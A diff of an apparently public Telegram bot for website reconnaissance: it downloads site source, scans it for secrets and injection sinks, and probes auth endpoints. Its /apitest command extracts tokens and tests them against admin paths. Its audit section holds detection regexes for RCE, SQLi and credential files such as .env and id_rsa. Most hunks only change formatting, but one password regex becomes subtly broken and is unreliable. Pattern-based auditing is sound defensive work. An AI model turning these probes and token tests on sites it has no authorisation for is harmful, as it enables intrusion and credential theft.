-        else: _mod_error('xss', '🎭 XSS')
-        # -- Build combined summary --
+        else: _mod_error('xss', '🎭 XSS          ')
+        # Combined summary ──────────────────────────────────────────────
         lines = [
-            f"🔎 *Full Discovery Report   `{domain}`*",
-            "------------------------------",
+            f"🔎 *Full Discovery Report — `{domain}`*",
+            "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━",
             f"📅 Date: `{datetime.now().strftime('%Y-%m-%d %H:%M')}`",
         ]
         
@@ -13852,7 +14102,7 @@ async def cmd_discover(update: Update, context: ContextTypes.DEFAULT_TYPE):
         spinner_task.cancel()
         await status_msg.edit_text("\n".join(lines), parse_mode='Markdown')
 
-        # -- Send detailed reports as files -------------------------------
+        # ── Send detailed reports as files ───────────────────────────────
         
         if not isinstance(sens_r, Exception):
             found_sens = len(sens_r.get("found", []))
@@ -13881,7 +14131,7 @@ async def cmd_discover(update: Update, context: ContextTypes.DEFAULT_TYPE):
         spinner_task.cancel()
         try:
             await status_msg.edit_text(
-                f"❌ *Discover Error   `{domain}`*\n\n`{type(_e).__name__}: {_e}`",
+                f"❌ *Discover Error — `{domain}`*\n\n`{type(_e).__name__}: {_e}`",
                 parse_mode='Markdown')
         except Exception: pass
 
@@ -13895,9 +14145,9 @@ async def _send_sensitive_report(update, context, url: str, result: dict):
         return
     
     lines = [
-        f"📂 *Sensitive Files Report   `{urlparse(url).hostname}`*",
-        "------------------------------",
-        f"Total found: `{len(result["files"])}`\n",
+        f"📂 *Sensitive Files Report — `{urlparse(url).hostname}`*",
+        "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━",
+        f"Total found: `{len(result['files'])}`\n",
         "*Files:*"]
     for f in result["files"]:
         lines.append(f"  - `{f}`")
@@ -13909,9 +14159,9 @@ async def _send_bola_report(update, context, url: str, result: dict):
         return
     
     lines = [
-        f"🔌 *BOLA/IDOR Report   `{urlparse(url).hostname}`*",
-        "------------------------------",
-        f"Total issues: `{len(result["issues"])}`\n",
+        f"🔌 *BOLA/IDOR Report — `{urlparse(url).hostname}`*",
+        "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━",
+        f"Total issues: `{len(result['issues'])}`\n",
         "*Issues:*"]
     for i in result["issues"]:
         lines.append(f"  - `{i}`")
@@ -13949,7 +14199,7 @@ async def _send_api_report(update, context, domain: str, result: dict):
             document=buf,
             filename=f"api_{safe_domain}_{ts}.json",
             caption=(
-                f"🔌 *API Report   `{domain}`*\n"
+                f"🔌 *API Report — `{domain}`*\n"
                 f"Endpoints: `{len(endpoints)}` | "
                 f"JSON: `{stats.get('json_apis',0)}` | "
                 f"Protected: `{stats.get('protected',0)}` | "
@@ -14008,7 +14258,7 @@ async def _send_subs_report(update, context, domain: str, data: dict):
             document=zip_buf,
             filename=f"subdomains_{safe_d}_{ts}.zip",
             caption=(
-                f"📡 *Subdomains   `{domain}`*\n"
+                f"📡 *Subdomains — `{domain}`*\n"
                 f"Total: `{total}` | Interesting: `{len(interesting)}`\n"
                 f"Files: `subdomains.txt` + `interesting.txt` + `subdomains.json`"
             ),
@@ -14018,13 +14268,13 @@ async def _send_subs_report(update, context, domain: str, data: dict):
         logging.debug("Scan error: %s", _e)
 
 
-# ------------------------------------------------
-# /sys     System Admin
+# ────────────────────────────────────────────────
+# /sys  —  System Admin
 # Replaces: /clean + /disk + /logs  (admin only)
-# ------------------------------------------------
+# ────────────────────────────────────────────────
 
 async def cmd_sys(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    """/sys [mode] - System management (admin only)
+    """/sys [mode] — System management (admin only)
     Modes: status(default) | clean | logs [n]
     Replaces: /clean /disk /logs
     """
@@ -14044,17 +14294,17 @@ async def cmd_sys(update: Update, context: ContextTypes.DEFAULT_TYPE):
     else:
         await update.effective_message.reply_text(
             "⚙️ *System Admin*\n\n"
-            "`/sys`            Storage status\n"
-            "`/sys clean`      Cleanup downloads\n"
-            "`/sys logs [n]`   View last n log lines",
+            "`/sys`          — Storage status\n"
+            "`/sys clean`    — Cleanup downloads\n"
+            "`/sys logs [n]` — View last n log lines",
             parse_mode='Markdown'
         )
 
 
-# ------------------------------------------------
-# /adminset     Admin Settings
+# ────────────────────────────────────────────────
+# /adminset  —  Admin Settings
 # Replaces: /setlimit + /setpages + /setassets
-# ------------------------------------------------
+# ────────────────────────────────────────────────
 
 async def cmd_adminset(update: Update, context: ContextTypes.DEFAULT_TYPE):
     """/adminset <type> <value>
@@ -14069,11 +14319,11 @@ async def cmd_adminset(update: Update, context: ContextTypes.DEFAULT_TYPE):
     if len(args) < 2:
         await update.effective_message.reply_text(
             "⚙️ *Admin Settings*\n\n"
-            "`/adminset limit <n>`    Daily download limit (0=∞)\n"
-            "`/adminset pages <n>`    Max crawl pages\n"
-            "`/adminset assets <n>`   Max assets per site\n\n"
+            "`/adminset limit <n>`  — Daily download limit (0=∞)\n"
+            "`/adminset pages <n>`  — Max crawl pages\n"
+            "`/adminset assets <n>` — Max assets per site\n\n"
             "*Current usage:*\n"
-            "  `/adminset limit <uid> <n>`   Per-user limit",
+            "  `/adminset limit <uid> <n>` — Per-user limit",
             parse_mode='Markdown'
         )
         return
@@ -14094,11 +14344,11 @@ async def cmd_adminset(update: Update, context: ContextTypes.DEFAULT_TYPE):
         )
 
 
-# ==================================================
-# 🔬  /analyze   Downloaded Source Code Analyzer
+# ══════════════════════════════════════════════════
+# 🔬  /analyze — Downloaded Source Code Analyzer
 #     Run AFTER /dl to scan for secrets, routes,
 #     XSS/SQLi sinks, hidden endpoints, CVEs
-# ==================================================
+# ══════════════════════════════════════════════════
 
 def _analyze_source_sync(domain: str) -> dict:
     """Scan downloaded files in DOWNLOAD_DIR/{domain_safe}/ for vulns."""
@@ -14166,7 +14416,7 @@ def _analyze_source_sync(domain: str) -> dict:
         elif ext in ('.html', '.htm'):
             result["stats"]["html_scanned"] += 1
 
-        # -- 1. Secrets scan ------------------------------------------
+        # ── 1. Secrets scan ──────────────────────────────────────────
         for line_no, line in enumerate(file_lines, 1):
             for pattern_str, label in _ANALYZE_SECRET_PATTERNS:
                 try:
@@ -14184,7 +14434,7 @@ def _analyze_source_sync(domain: str) -> dict:
                 except Exception:
                     pass
 
-        # -- 2. Routes + hidden endpoints (JS only) -------------------
+        # ── 2. Routes + hidden endpoints (JS only) ───────────────────
         if ext in ('.js', '.jsx', '.ts', '.tsx'):
             for pat in _ROUTE_PATTERNS:
                 for m in pat.finditer(content):
@@ -14203,7 +14453,7 @@ def _analyze_source_sync(domain: str) -> dict:
                         seen_endpoints.add(url)
                         result["hidden_endpoints"].append(url)
 
-            # -- 3. XSS sinks -----------------------------------------
+            # ── 3. XSS sinks ─────────────────────────────────────────
             for line_no, line in enumerate(file_lines, 1):
                 for sink_pat, sink_label in _XSS_SINK_PATTERNS:
                     if sink_pat.search(line):
@@ -14212,7 +14462,7 @@ def _analyze_source_sync(domain: str) -> dict:
                             "line": line_no, "code": line.strip()[:120],
                         })
 
-            # -- 4. SQLi sinks -----------------------------------------
+            # ── 4. SQLi sinks ─────────────────────────────────────────
             for line_no, line in enumerate(file_lines, 1):
                 for sink_pat, sink_label in _SQLI_SINK_PATTERNS:
                     if sink_pat.search(line):
@@ -14221,7 +14471,7 @@ def _analyze_source_sync(domain: str) -> dict:
                             "line": line_no, "code": line.strip()[:120],
                         })
 
-        # -- 5. Dependency audit (package.json) -----------------------
+        # ── 5. Dependency audit (package.json) ───────────────────────
         if fname_lower.endswith('package.json') and '"dependencies"' in content:
             try:
                 pkg = json.loads(content)
@@ -14256,7 +14506,7 @@ def _analyze_source_sync(domain: str) -> dict:
 
 
 async def cmd_analyze(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    """/analyze <domain>  - Scan downloaded source code for secrets/routes/XSS/SQLi/CVEs"""
+    """/analyze <domain>  — Scan downloaded source code for secrets/routes/XSS/SQLi/CVEs"""
     if not await check_force_join(update, context):
         return
     uid = update.effective_user.id
@@ -14298,7 +14548,7 @@ async def cmd_analyze(update: Update, context: ContextTypes.DEFAULT_TYPE):
 
     if uid in _active_scans:
         await update.effective_message.reply_text(
-            f"⏳ *`{_active_scans.get(uid)}` running*   `/stop` နှိပ်ပါ",
+            f"⏳ *`{_active_scans.get(uid)}` running* — `/stop` နှိပ်ပါ",
             parse_mode='Markdown'
         )
         return
@@ -14326,11 +14576,11 @@ async def cmd_analyze(update: Update, context: ContextTypes.DEFAULT_TYPE):
     finally:
         _active_scans.pop(uid, None)  # Always unlock after scan
 
-    try:  # Wrap all post-scan output   _active_scans already unlocked above
+    try:  # Wrap all post-scan output — _active_scans already unlocked above
         st = result["stats"]
         lines_out = [
-            f"🔬 *Source Analysis   `{domain}`*",
-            "--------------------",
+            f"🔬 *Source Analysis — `{domain}`*",
+            "━━━━━━━━━━━━━━━━━━━━",
             f"📂 Files: `{st['files_scanned']}` | JS: `{st['js_scanned']}` | HTML: `{st['html_scanned']}`\n",
         ]
 
@@ -14404,7 +14654,7 @@ async def cmd_analyze(update: Update, context: ContextTypes.DEFAULT_TYPE):
         else:
             lines_out.append("*📦 Dependencies:* ✅ No known CVEs\n")
 
-        lines_out.append("--------------------")
+        lines_out.append("━━━━━━━━━━━━━━━━━━━━")
         lines_out.append(f"_Next: `/apitest https://{domain}` for API token test_")
 
         report = "\n".join(lines_out)
@@ -14461,7 +14711,7 @@ async def cmd_analyze(update: Update, context: ContextTypes.DEFAULT_TYPE):
             document=buf,
             filename=f"analysis_{safe_d}_{ts}.json",
             caption=(
-                f"🔬 *Analysis   `{domain}`*\n"
+                f"🔬 *Analysis — `{domain}`*\n"
                 f"🔑:`{st['total_secrets']}` 🗺️:`{st['total_routes']}` "
                 f"💣:`{st['total_xss']}` 💉:`{st['total_sqli']}` "
                 f"📦:`{len(result['vuln_deps'])}`"
@@ -14472,11 +14722,11 @@ async def cmd_analyze(update: Update, context: ContextTypes.DEFAULT_TYPE):
         logger.debug("analyze export: %s", _e)
 
 
-# ==================================================
-# 🔐  /apitest   API Token Extractor & Tester
+# ══════════════════════════════════════════════════
+# 🔐  /apitest — API Token Extractor & Tester
 #     Probes auth endpoints, extracts tokens,
 #     tests against admin paths, exports Postman JSON
-# ==================================================
+# ══════════════════════════════════════════════════
 
 def _apitest_sync(base_url: str, progress_q: list) -> dict:
     """Probe auth endpoints, extract tokens, test admin access, check CORS."""
@@ -14568,7 +14818,7 @@ def _apitest_sync(base_url: str, progress_q: list) -> dict:
         f"🔐 Methods: `{', '.join(result['auth_methods']) or 'None'}`"
     )
 
-    # -- Step 2: Test tokens vs admin endpoints ------------------------
+    # ── Step 2: Test tokens vs admin endpoints ────────────────────────
     if found_tokens:
         progress_q.append(f"🧪 Step 2/3: Testing `{len(found_tokens)}` tokens...")
         for tok in found_tokens[:5]:
@@ -14601,7 +14851,7 @@ def _apitest_sync(base_url: str, progress_q: list) -> dict:
                     except Exception:
                         pass
 
-    # -- Step 3: CORS check --------------------------------------------
+    # ── Step 3: CORS check ────────────────────────────────────────────
     progress_q.append("🌐 Step 3/3: CORS checking...")
     for ep_info in result["auth_endpoints"][:10]:
         try:
@@ -14625,7 +14875,7 @@ def _apitest_sync(base_url: str, progress_q: list) -> dict:
 
 
 async def cmd_apitest(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    """/apitest <url>  - Extract & test API tokens from auth endpoints"""
+    """/apitest <url>  — Extract & test API tokens from auth endpoints"""
     if not await check_force_join(update, context):
         return
     uid = update.effective_user.id
@@ -14660,7 +14910,7 @@ async def cmd_apitest(update: Update, context: ContextTypes.DEFAULT_TYPE):
 
     if uid in _active_scans:
         await update.effective_message.reply_text(
-            f"⏳ *`{_active_scans.get(uid)}` running*   `/stop` နှိပ်ပါ",
+            f"⏳ *`{_active_scans.get(uid)}` running* — `/stop` နှိပ်ပါ",
             parse_mode='Markdown'
         )
         return
@@ -14668,7 +14918,7 @@ async def cmd_apitest(update: Update, context: ContextTypes.DEFAULT_TYPE):
     _active_scans.set(uid, "API Token Test")
     domain = urlparse(url).netloc
     msg    = await update.effective_message.reply_text(
-        f"🔐 *API Token Test   `{domain}`*\n\nStep 1/3: Auth endpoints probe...\n⏳",
+        f"🔐 *API Token Test — `{domain}`*\n\nStep 1/3: Auth endpoints probe...\n⏳",
         parse_mode='Markdown'
     )
     progress_q: list = []
@@ -14680,7 +14930,7 @@ async def cmd_apitest(update: Update, context: ContextTypes.DEFAULT_TYPE):
                 txt = progress_q[-1]; progress_q.clear()
                 try:
                     await msg.edit_text(
-                        f"🔐 *API Token Test   `{domain}`*\n\n{txt}",
+                        f"🔐 *API Token Test — `{domain}`*\n\n{txt}",
                         parse_mode='Markdown'
                     )
                 except Exception:
@@ -14700,8 +14950,8 @@ async def cmd_apitest(update: Update, context: ContextTypes.DEFAULT_TYPE):
         prog.cancel()
 
     lines_out = [
-        f"🔐 *API Token Test   `{domain}`*",
-        "--------------------",
+        f"🔐 *API Token Test — `{domain}`*",
+        "━━━━━━━━━━━━━━━━━━━━",
         f"⏰ `{datetime.now().strftime('%Y-%m-%d %H:%M')}`\n",
     ]
 
@@ -14742,7 +14992,7 @@ async def cmd_apitest(update: Update, context: ContextTypes.DEFAULT_TYPE):
             )
         lines_out.append("")
 
-    lines_out.append("--------------------")
+    lines_out.append("━━━━━━━━━━━━━━━━━━━━")
     lines_out.append("_Next: `/analyze <domain>` for source code scan_")
 
     report = "\n".join(lines_out)
@@ -14759,7 +15009,7 @@ async def cmd_apitest(update: Update, context: ContextTypes.DEFAULT_TYPE):
         if result["auth_endpoints"]:
             postman = {
                 "info": {
-                    "name": f"API Test   {domain}",
+                    "name": f"API Test — {domain}",
                     "_postman_id": hashlib.md5(domain.encode()).hexdigest(),
                     "schema": "https://schema.getpostman.com/json/collection/v2.1.0/collection.json"
                 },
@@ -14788,7 +15038,7 @@ async def cmd_apitest(update: Update, context: ContextTypes.DEFAULT_TYPE):
                 document=buf,
                 filename=f"postman_{_safe_d}_{ts}.json",
                 caption=(
-                    f"📤 *Postman Collection   `{domain}`*\n"
+                    f"📤 *Postman Collection — `{domain}`*\n"
                     f"Endpoints: `{len(result['auth_endpoints'])}`\n"
                     f"Import → Set `{{{{token}}}}` → Test!"
                 ),
@@ -14798,13 +15048,13 @@ async def cmd_apitest(update: Update, context: ContextTypes.DEFAULT_TYPE):
         logger.debug("postman export: %s", _e)
 
 
-# ==================================================
-# 🗑️  /cleandl   Admin: clean downloaded source dirs
-# ==================================================
+# ══════════════════════════════════════════════════
+# 🗑️  /cleandl — Admin: clean downloaded source dirs
+# ══════════════════════════════════════════════════
 
 @admin_only
 async def cmd_cleandl(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    """/cleandl [domain] - Delete source folder(s) to free disk space (admin only)"""
+    """/cleandl [domain] — Delete source folder(s) to free disk space (admin only)"""
     if not context.args:
         # List all downloaded domains
         try:
@@ -14815,7 +15065,7 @@ async def cmd_cleandl(update: Update, context: ContextTypes.DEFAULT_TYPE):
             dirs, zips = [], []
         if not dirs and not zips:
             await update.effective_message.reply_text(
-                "📂 *Downloaded Sources*\n\nEmpty   nothing to clean.",
+                "📂 *Downloaded Sources*\n\nEmpty — nothing to clean.",
                 parse_mode='Markdown'
             )
             return
@@ -14834,9 +15084,9 @@ async def cmd_cleandl(update: Update, context: ContextTypes.DEFAULT_TYPE):
                     for r, _, fs in os.walk(os.path.join(DOWNLOAD_DIR, d))
                     for fn in fs
                 ) / 1024 / 1024
-                lines.append(f"  `{d}`   {sz:.1f}MB")
-        lines.append("\n_Usage: `/cleandl <domain>`   specific domain_")
-        lines.append("_`/cleandl all`   delete ALL source folders_")
+                lines.append(f"  `{d}` — {sz:.1f}MB")
+        lines.append("\n_Usage: `/cleandl <domain>` — specific domain_")
+        lines.append("_`/cleandl all` — delete ALL source folders_")
         await update.effective_message.reply_text(
             "\n".join(lines), parse_mode='Markdown'
         )
@@ -14879,18 +15129,18 @@ async def cmd_cleandl(update: Update, context: ContextTypes.DEFAULT_TYPE):
         )
     else:
         await update.effective_message.reply_text(
-            f"❌ `{domain}`   not found in downloads",
+            f"❌ `{domain}` — not found in downloads",
             parse_mode='Markdown'
         )
 
 
-# ==================================================
-# 📖  /afterdl   Guide command
-# ==================================================
+# ══════════════════════════════════════════════════
+# 📖  /afterdl — Guide command
+# ══════════════════════════════════════════════════
 
 @admin_only
 async def cmd_gofileinfo(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    """/gofileinfo - Check gofile.io account status and storage usage"""
+    """/gofileinfo — Check gofile.io account status and storage usage"""
     msg = await update.effective_message.reply_text(
         "🔍 gofile.io account info ရှာနေပါတယ်...", parse_mode='Markdown'
     )
@@ -14917,7 +15167,7 @@ async def cmd_gofileinfo(update: Update, context: ContextTypes.DEFAULT_TYPE):
 
     await msg.edit_text(
         f"☁️ *gofile.io Account*\n"
-        f"---------------\n"
+        f"━━━━━━━━━━━━━━━\n"
         f"📧 Email: `{email}`\n"
         f"🎫 Tier: `{tier}`\n"
         f"📁 Files: `{files_count}` | Folders: `{folders_count}`\n"
@@ -14929,10 +15179,10 @@ async def cmd_gofileinfo(update: Update, context: ContextTypes.DEFAULT_TYPE):
     )
 
 async def cmd_afterdl(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    """/afterdl - Step-by-step guide: what to do after /dl and /discover"""
+    """/afterdl — Step-by-step guide: what to do after /dl and /discover"""
     await update.effective_message.reply_text(
         "🎯 */dl ပြီးရင် ဘာလုပ်ရမလဲ?*\n"
-        "--------------------\n\n"
+        "━━━━━━━━━━━━━━━━━━━━\n\n"
         "*Downloaded ZIP ထဲမှာ:*\n"
         "  HTML pages + JS bundles + CSS + images\n\n"
         "*1️⃣ `/analyze <domain>`* ← အရေးကြီးဆုံး\n"
@@ -14948,7 +15198,7 @@ async def cmd_afterdl(update: Update, context: ContextTypes.DEFAULT_TYPE):
         "  → .map files → original source code\n\n"
         "*4️⃣ `/gitexposed <url>`*\n"
         "  → .git/config exposed စစ်\n\n"
-        "--------------------\n\n"
+        "━━━━━━━━━━━━━━━━━━━━\n\n"
         "🎯 */discover ပြီး Admin API ရရင်:*\n\n"
         "*1️⃣ `/apitest <url>`*\n"
         "  → Token extraction + admin test\n"
@@ -14963,16 +15213,16 @@ async def cmd_afterdl(update: Update, context: ContextTypes.DEFAULT_TYPE):
     )
 
 
-# ==================================================
-# 🔍  /codeaudit   Backend Source Code Auditor
+# ══════════════════════════════════════════════════
+# 🔍  /codeaudit — Backend Source Code Auditor
 #     Run after /dl to find backend-side vulns:
 #     PHP RCE, SQLi, path traversal, hardcoded creds,
 #     .env leaks, exposed admin panels, config files
-# ==================================================
+# ══════════════════════════════════════════════════
 
-# -- PHP dangerous functions -------------------------------------------
+# ── PHP dangerous functions ───────────────────────────────────────────
 _PHP_RCE_PATTERNS = [
-    (re.compile(r'\beval\s*\('),                                  '🔴 PHP eval()   RCE risk'),
+    (re.compile(r'\beval\s*\('),                                  '🔴 PHP eval() — RCE risk'),
     (re.compile(r'\b(system|exec|shell_exec|passthru)\s*\('),     '🔴 OS command execution'),
     (re.compile(r'`[^`]{3,80}`'),                                 '🔴 Backtick shell execution'),
     (re.compile(r'\bpopen\s*\('),                                 '🔴 popen() command exec'),
@@ -14986,86 +15236,86 @@ _PHP_SQLI_PATTERNS = [
     (re.compile(r'(?i)\$_(GET|POST|REQUEST|COOKIE)\[.*?\].*?(mysql_query|mysqli_query|pg_query|mssql_query|pdo->query|pdo->prepare)\s*\('), '🔴 Direct user input in SQL query'),
     (re.compile(r'(?i)"(?:SELECT|INSERT|UPDATE|DELETE).+?"\s*\.\s*\$_(GET|POST|REQUEST|COOKIE)'), '🔴 SQL string concat with user input'),
     (re.compile(r"(?i)'(?:SELECT|INSERT|UPDATE|DELETE).+?'\s*\.\s*\$_(GET|POST|REQUEST|COOKIE)"), '🔴 SQL string concat with user input'),
-    (re.compile(r'(?i)\$sql\s*=\s*["\x27](?:SELECT|INSERT|UPDATE|DELETE).*?["\x27]\s*\.\s*\$'), '🟠 SQL variable concat'),
+    (re.compile(r'(?i)\$sql\s*=\s*["\x27"](?:SELECT|INSERT|UPDATE|DELETE).*?["\x27"]\s*\.\s*\$'), '🟠 SQL variable concat'),
     (re.compile(r'(?i)sprintf\s*\(.*?(?:SELECT|INSERT|UPDATE|DELETE).*?%[sd].*?\$_(GET|POST|REQUEST|COOKIE)'), '🟠 sprintf SQL injection'),
-    (re.compile(r'(?i)\$pdo->(?:query|exec|prepare)\s*\(\s*["\x27].*?\$_(GET|POST|REQUEST|COOKIE)'), '🔴 PDO query with direct user input'),
+    (re.compile(r'(?i)\$pdo->(?:query|exec|prepare)\s*\(\s*["\x27"].*?\$_(GET|POST|REQUEST|COOKIE)'), '🔴 PDO query with direct user input'),
 ]
 
 _PHP_LFI_PATTERNS = [
     (re.compile(r'(?i)(?:include|require|include_once|require_once)\s*\(\s*\$_(GET|POST|REQUEST|COOKIE)'), '🔴 File inclusion with user input (LFI/RFI)'),
-    (re.compile(r'(?i)(?:include|require|include_once|require_once)\s*\(\s*["\x27].*?\.\s*\$_(GET|POST)'),   '🔴 Dynamic path file inclusion'),
+    (re.compile(r'(?i)(?:include|require|include_once|require_once)\s*\(\s*["\x27"].*?\.\s*\$_(GET|POST)'),   '🔴 Dynamic path file inclusion'),
     (re.compile(r'(?i)file_get_contents\s*\(\s*\$_(GET|POST|REQUEST|COOKIE)'),                             '🟠 file_get_contents with user input (SSRF/LFI)'),
     (re.compile(r'(?i)readfile\s*\(\s*\$_(GET|POST|REQUEST|COOKIE)'),                                     '🟠 readfile with user input'),
     (re.compile(r'(?i)fopen\s*\(\s*\$_(GET|POST|REQUEST|COOKIE)'),                                        '🟠 fopen with user input'),
 ]
 
 _PHP_XSS_PATTERNS = [
-    (re.compile(r"(?i)echo\s+\$_(GET|POST|REQUEST|COOKIE)\[[\x27\"]"),                             "🔴 echo user input directly (XSS)"),
-    (re.compile(r'(?i)print\s+\$_(GET|POST|REQUEST|COOKIE)\['),  '🔴 print user input directly (XSS)'),
+    (re.compile(r'(?i)echo\s+\$_(GET|POST|REQUEST|COOKIE)\['),                             '🔴 echo user input directly (XSS)'),
+    (re.compile(r'(?i)print\s+\$_(GET|POST|REQUEST|COOKIE)\['),                            '🔴 print user input directly (XSS)'),
     (re.compile(r'(?i)<\?php.*?echo\s+\$_(GET|POST|REQUEST|COOKIE)'),                     '🟠 PHP short tag echo user input'),
     (re.compile(r'(?i)printf\s*\(.*?\$_(GET|POST|REQUEST|COOKIE)'),                       '🟠 printf with user input (XSS)'),
 ]
 
 _PHP_UPLOAD_PATTERNS = [
-    (re.compile(r'(?i)move_uploaded_file\s*\(.*?\$_FILES'),                               '🟠 File upload   check MIME validation'),
+    (re.compile(r'(?i)move_uploaded_file\s*\(.*?\$_FILES'),                               '🟠 File upload — check MIME validation'),
     (re.compile(r'(?i)pathinfo\s*\(.*?\$_FILES.*?extension'),                             '🟡 pathinfo extension check (bypassable)'),
     (re.compile(r'(?i)\$_FILES\[.*?\]\[.name.\].*?move_uploaded_file'),                   '🟠 Unvalidated filename in move_uploaded_file'),
 ]
 
-# -- Python/Django/Flask dangerous patterns ----------------------------
+# ── Python/Django/Flask dangerous patterns ────────────────────────────
 _PYTHON_VULN_PATTERNS = [
-    (re.compile(r'\beval\s*\('),                                  '🔴 eval()   code injection risk'),
-    (re.compile(r'\bexec\s*\('),                                  '🔴 exec()   code injection risk'),
-    (re.compile(r'\bos\.system\s*\('),                            '🔴 os.system()   command injection'),
-    (re.compile(r'\bsubprocess\.(call|run|Popen)\s*\(.*?shell\s*=\s*True'), '🔴 subprocess shell=True   injection risk'),
-    (re.compile(r'(?i)cursor\.execute\s*\(\s*["\x27].*?%\s*\('),   '🔴 %-formatted SQL (SQLi)'),
-    (re.compile(r'(?i)cursor\.execute\s*\(\s*f["\x27]'),            '🔴 f-string SQL query (SQLi)'),
-    (re.compile(r'(?i)render_template_string\s*\(.*?request\.(args|form|json)'), '🔴 SSTI   render_template_string with user input'),
+    (re.compile(r'\beval\s*\('),                                  '🔴 eval() — code injection risk'),
+    (re.compile(r'\bexec\s*\('),                                  '🔴 exec() — code injection risk'),
+    (re.compile(r'\bos\.system\s*\('),                            '🔴 os.system() — command injection'),
+    (re.compile(r'\bsubprocess\.(call|run|Popen)\s*\(.*?shell\s*=\s*True'), '🔴 subprocess shell=True — injection risk'),
+    (re.compile(r'(?i)cursor\.execute\s*\(\s*["\x27"].*?%\s*\('),   '🔴 %-formatted SQL (SQLi)'),
+    (re.compile(r'(?i)cursor\.execute\s*\(\s*f["\x27"]'),            '🔴 f-string SQL query (SQLi)'),
+    (re.compile(r'(?i)render_template_string\s*\(.*?request\.(args|form|json)'), '🔴 SSTI — render_template_string with user input'),
     (re.compile(r'(?i)yaml\.load\s*\([^)]*Loader\s*=\s*None'),   '🟠 yaml.load without SafeLoader (arbitrary code)'),
-    (re.compile(r'(?i)pickle\.loads?\s*\('),                      '🟠 pickle.load   arbitrary code on untrusted data'),
+    (re.compile(r'(?i)pickle\.loads?\s*\('),                      '🟠 pickle.load — arbitrary code on untrusted data'),
     (re.compile(r'(?i)request\.(args|form|json)\[.*?\].*?open\s*\('), '🟠 User input in file open (path traversal)'),
     (re.compile(r'(?i)DEBUG\s*=\s*True'),                         '🟡 Django/Flask DEBUG=True (production leak)'),
-    (re.compile(r'(?i)SECRET_KEY\s*=\s*["\x27][a-z0-9]{1,20}["\x27]'), '🟡 Weak/default SECRET_KEY'),
+    (re.compile(r'(?i)SECRET_KEY\s*=\s*["\x27"][a-z0-9]{1,20}["\x27"]'), '🟡 Weak/default SECRET_KEY'),
 ]
 
-# -- Hardcoded credential patterns -------------------------------------
+# ── Hardcoded credential patterns ─────────────────────────────────────
 _CRED_PATTERNS = [
-    (re.compile(r'(?i)define\s*\(\s*["\x27](?:DB_PASSWORD|DATABASE_PASSWORD|MYSQL_PASSWORD)["\x27],\s*["\x27]([^"\x27]{3,})["\x27]'), '🔴 Hardcoded DB password (define)'),
-    (re.compile(r'(?i)\$(?:db_?pass(?:word)?|mysql_?pass|pg_?pass)\s*=\s*["\x27]([^"\x27]{3,})["\x27]'),   '🔴 Hardcoded DB password variable'),
-    (re.compile(r'(?i)(?:password|passwd|pwd)\s*=\s*["\x27]([^\s"\x27]{8,})["\x27]'),                        '🟠 Hardcoded password'),
-    (re.compile(r'(?i)(?:secret_key|app_secret|api_secret)\s*=\s*["\x27]([^"\x27]{8,})["\x27]'),            '🟠 Hardcoded secret'),
-    (re.compile(r'(?i)(?:admin|root|superuser)\s*[:=]\s*["\x27]([^"\x27]{3,})["\x27].*?(?:pass|pwd|secret)'), '🟡 Admin credential pattern'),
+    (re.compile(r'(?i)define\s*\(\s*["\x27"](?:DB_PASSWORD|DATABASE_PASSWORD|MYSQL_PASSWORD)["\x27"],\s*["\x27"]([^"\x27]{3,})["\x27"]'), '🔴 Hardcoded DB password (define)'),
+    (re.compile(r'(?i)\$(?:db_?pass(?:word)?|mysql_?pass|pg_?pass)\s*=\s*["\x27"]([^"\x27]{3,})["\x27"]'),   '🔴 Hardcoded DB password variable'),
+    (re.compile(r'(?i)(?:password|passwd|pwd)\s*=\s*["\x27"]([^\\s"\x27]]{8,})["\x27"]'),                        '🟠 Hardcoded password'),
+    (re.compile(r'(?i)(?:secret_key|app_secret|api_secret)\s*=\s*["\x27"]([^"\x27]{8,})["\x27"]'),            '🟠 Hardcoded secret'),
+    (re.compile(r'(?i)(?:admin|root|superuser)\s*[:=]\s*["\x27"]([^"\x27]{3,})["\x27"].*?(?:pass|pwd|secret)'), '🟡 Admin credential pattern'),
 ]
 
-# -- Sensitive file patterns found in downloaded zip -------------------
+# ── Sensitive file patterns found in downloaded zip ───────────────────
 _SENSITIVE_FILES = [
-    (r'\.env$',                   '🔴 .env file   may contain all secrets'),
+    (r'\.env$',                   '🔴 .env file — may contain all secrets'),
     (r'\.env\.(local|prod|production|staging|backup)$', '🔴 .env variant file'),
-    (r'config\.php$',             '🟠 config.php   check for DB credentials'),
-    (r'wp-config\.php$',          '🔴 wp-config.php   WordPress DB credentials'),
-    (r'database\.php$',           '🟠 database.php   DB config'),
-    (r'settings\.py$',            '🟠 Django settings.py   check SECRET_KEY/DB'),
-    (r'config\.yml$',             '🟠 config.yml   may contain secrets'),
+    (r'config\.php$',             '🟠 config.php — check for DB credentials'),
+    (r'wp-config\.php$',          '🔴 wp-config.php — WordPress DB credentials'),
+    (r'database\.php$',           '🟠 database.php — DB config'),
+    (r'settings\.py$',            '🟠 Django settings.py — check SECRET_KEY/DB'),
+    (r'config\.yml$',             '🟠 config.yml — may contain secrets'),
     (r'application\.yml$',        '🟠 Spring Boot application.yml'),
-    (r'docker-compose\.yml$',     '🟡 docker-compose.yml   check env vars'),
-    (r'Dockerfile$',              '🟡 Dockerfile   check ENV secrets'),
-    (r'\.htpasswd$',              '🔴 .htpasswd   HTTP Basic Auth hashes'),
-    (r'\.htaccess$',              '🟡 .htaccess   server config'),
+    (r'docker-compose\.yml$',     '🟡 docker-compose.yml — check env vars'),
+    (r'Dockerfile$',              '🟡 Dockerfile — check ENV secrets'),
+    (r'\.htpasswd$',              '🔴 .htpasswd — HTTP Basic Auth hashes'),
+    (r'\.htaccess$',              '🟡 .htaccess — server config'),
     (r'id_rsa$',                  '🔴 Private SSH key!'),
     (r'\.pem$',                   '🔴 PEM certificate/key file'),
-    (r'backup\.sql$',             '🔴 SQL backup   may contain full database'),
+    (r'backup\.sql$',             '🔴 SQL backup — may contain full database'),
     (r'dump\.sql$',               '🔴 SQL dump file'),
-    (r'error_log$',               '🟡 Error log   may expose paths/stack traces'),
+    (r'error_log$',               '🟡 Error log — may expose paths/stack traces'),
     (r'debug\.log$',              '🟡 Debug log file'),
